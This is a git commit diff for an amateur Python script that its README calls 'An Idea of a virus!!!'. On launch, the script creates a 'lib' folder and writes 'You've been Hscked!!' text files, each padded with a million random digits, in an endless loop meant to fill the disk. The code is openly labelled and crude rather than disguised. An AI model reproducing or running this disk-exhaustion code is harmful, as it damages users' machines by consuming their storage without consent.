faae06a1d05075fa041d8d14f065c28a49df898c
BlankGodd <blankgodd33@gmail.com>
2020-04-20 03:31:28 +0100

    Edited README and some lines of code

--- README.md
+++ README.md
@@ -1,2 +1,8 @@
 # First-V
+
 Just a brilliant idea. Lets see how it goes
+
+# Run script at your own Risk
+# I won't be held accountable for any damage
+
+An Idea of a virus!!!
--- v.py
+++ v.py
@@ -1,13 +1,29 @@
+#!/usr/bin/python
+# Author:   @BlankGodd
+
 import random
 import os
 
+
 class Invade:
+
     def __init__(self):
+        # A gui that displays "You have been hacked
+        self.infiltrate()
+
+    def infiltrate(self):
         # I AM HERE THE STEAL YOUR SPACE
         j = 1
+        main_path = os.getcwd()
+        path = os.path.join(main_path, 'lib')
+        if not os.path.exists(path):
+            os.mkdir(path)
+        else:
+            pass
         while True:
             i = [0, 1]
-            file_name = 'file{0}.txt'.format(j)
+            name = 'file{0}.txt'.format(j)
+            file_name = os.path.join(path, name)
             with open(file_name, 'w') as f:
                 b = random.choice(i)
                 f.write("You've been Hscked!!{0}[-a]\n".format(b))
@@ -15,6 +31,9 @@ class Invade:
                 c = [random.choice(i) for u in range(1000000)]
                 g.write(str(c))
             j += 1
+
+    def automate(self):
+        pass
 
 
 Invade()
